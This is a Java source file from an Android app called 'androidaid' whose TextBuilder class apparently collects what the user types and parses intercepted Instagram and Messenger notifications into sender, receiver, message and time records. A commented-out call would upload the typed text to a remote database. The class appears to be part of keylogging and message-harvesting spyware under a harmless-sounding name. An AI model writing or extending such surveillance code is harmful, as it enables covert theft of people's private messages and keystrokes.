package androidaid.android.com.androidaid.core;

import android.app.Notification;
import android.os.Bundle;

import androidaid.android.com.androidaid.networking.DatabaseNetworking;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.utilities.StringUtils;
import androidaid.android.com.androidaid.utilities.SystemTools;

public class TextBuilder {

    //todo: DO YOU EVEN HAVE TO APPEND? JUST HAVE ONE STRING AND JUST ADJUST IT TO WHAT IS TYPED INSIDE THE TEXTBOX
    private static StringBuilder textBuilder = new StringBuilder();
    private static StringBuilder notifications = new StringBuilder();

    /**
     * Adds the text
     * @param text
     */
    public static void addText(String text) {
        if(null != text) {
            System.out.println("[sproc32.TextBuilder.addText]: Added| " + text);
            textBuilder.append(text);

            /*
            if(textBuilder.toString().contains(" ")) {
                DatabaseNetworking.storeText(textBuilder.toString(), SystemTools.getCurrentDateAndTime());
            }
            */
        }
    }

    /**
     * Get the text
     * @return
     */
    public static String getText() {
        System.out.println("[sproc32.TextBuilder.getText]: Returning] " + textBuilder.toString());
        return textBuilder.toString();
    }

    /**
     * Clears the text
     */
    public static void clearText() {
        System.out.println("[sproc32.TextBuilder.clearText]: Clearing text");
        textBuilder.delete(0, textBuilder.length());
    }

    /**
     * Parses a notification from instagram to fit the |NOTIF_TYPE|SENDER|RECEIVER|TEXT format and stores it under notifications
     * @param instaNotification
     */
    public static void addInstagramNotification(String instaNotification, String time) {
        String[] parts = instaNotification.split(":");

        String receiver = StringUtils.omitBrackets(parts[0]);
        String sender = StringUtils.removeWhitespace(parts[1]);
        String text = parts[2];

        String parsedNotif = Constants.NOTIFICATION_INSTAGRAM + "|" + sender + "|" + receiver + "|" + text + "|" + time + "\n";
        System.out.println("[sproc32.TextBuilder.addInstagramNotification]: parsedNotif = " + parsedNotif);

        notifications.append(parsedNotif);
    }

    public static void addMessengerNotification(Notification notification, String time) {
        // For API 19 and above, `Notifications` carry an `extras` bundle with them
        // From this bundle, you can extract info such as:

        //      `EXTRA_TITLE`     -  as supplied to setContentTitle(CharSequence)
        //      `EXTRA_TEXT `     -  as supplied to setContentText(CharSequence)
        //      `EXTRA_INFO_TEXT` -  as supplied to setContentInfo(CharSequence)
        //      ... more at: http://developer.android.com/reference/android/app/Notification.html

        Bundle notifBundle = notification.extras;
        System.out.println("[sproc32.MAS.messenger]: notificationTitle = " + notifBundle.get(Notification.EXTRA_TITLE));
        System.out.println("[sproc32.MAS.messenger]: notificationText = " + notifBundle.get(Notification.EXTRA_TEXT));
        System.out.println("[sproc32.MAS.meesenger]: notificationInfoText = " + notifBundle.get(Notification.EXTRA_INFO_TEXT));

        try {
            String sender = notifBundle.get(Notification.EXTRA_TITLE).toString();
            String message = notifBundle.get(Notification.EXTRA_TEXT).toString();
            String receiver = ""; //todo: find out a way to get receiver of a facebook notification

            String parsedNotif = Constants.NOTIFICATION_FACEBOOK + "|" + sender + "|" + receiver + "|" + message + "|" + time + "\n";
            System.out.println("[sproc32.TextBuilder.addMessengerNotification]: parsedNotif = " + parsedNotif);
            notifications.append(parsedNotif);
        } catch (NullPointerException e) {
            e.printStackTrace();
        }
    }

}
